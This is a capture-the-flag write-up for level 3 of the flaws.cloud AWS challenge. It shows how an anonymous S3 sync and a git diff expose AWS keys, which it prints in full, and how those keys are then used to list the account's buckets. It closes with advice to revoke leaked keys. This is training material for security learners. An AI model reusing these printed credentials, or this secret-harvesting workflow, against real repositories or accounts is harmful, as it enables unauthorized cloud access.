# Flaws Cloud
### URl: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/

# Level 3
### The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

# Writeup

```
$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2

... it will download all the files ...
```

Now, with `git log` we can get the commit history

```
$ git log
...
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

yay, there is a commit named as `Oops, accidentally added something I shouldn't have`. So there might be some juicy content in that file.

On checking difference between commits, we can see aws credentials.

```
$ git diff b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 f52ec03b227ea6094b04e43f475fb0126edb5a61
diff --git a/access_keys.txt b/access_keys.txt
new file mode 100644
index 0000000..e3ae6dd
--- /dev/null
+++ b/access_keys.txt
@@ -0,0 +1,2 @@
+access_key AKIAJ366LIPB4IJKT7SA
+secret_access_key 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
```

Using `aws config` we can configure new user's credentials.

If we list all the buckets, we can see all the buckets from level 1 to 6. But of course you can't cheat by going to leevl 5 or 6, because the creator already know about it, haha. It will say `Don't try to cheat and skip levels.`

```
$ aws s3api list-buckets
{
    "Buckets": [
        {
            "Name": "2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud",
            "CreationDate": "2017-02-12T21:31:07.000Z"
        },
        {
            "Name": "config-bucket-975426262029",
            "CreationDate": "2017-05-29T16:34:53.000Z"
        },
        {
            "Name": "flaws-logs",
            "CreationDate": "2017-02-12T20:03:24.000Z"
        },
        {
            "Name": "flaws.cloud",
            "CreationDate": "2017-02-05T03:40:07.000Z"
        },
        {
            "Name": "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud",
            "CreationDate": "2017-02-24T01:54:13.000Z"
        },
        {
            "Name": "level3-9afd3927f195e10225021a578e6f78df.flaws.cloud",
            "CreationDate": "2017-02-26T18:15:44.000Z"
        },
        {
            "Name": "level4-1156739cfb264ced6de514971a4bef68.flaws.cloud",
            "CreationDate": "2017-02-26T18:16:06.000Z"
        },
        {
            "Name": "level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud",
            "CreationDate": "2017-02-26T19:44:51.000Z"
        },
        {
            "Name": "level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud",
            "CreationDate": "2017-02-26T19:47:58.000Z"
        },
        {
            "Name": "theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud",
            "CreationDate": "2017-02-26T20:06:32.000Z"
        }
    ],
    "Owner": {
        "DisplayName": "0xdabbad00",
        "ID": "d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73"
    }
}
```

Next, level 4: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/

# How to stop this vulnerability
- People often leak AWS keys and then try to cover up their mistakes without revoking the keys. You should always revoke any AWS keys (or any secrets) that could have been leaked or were misplaced. Roll your secrets early and often.
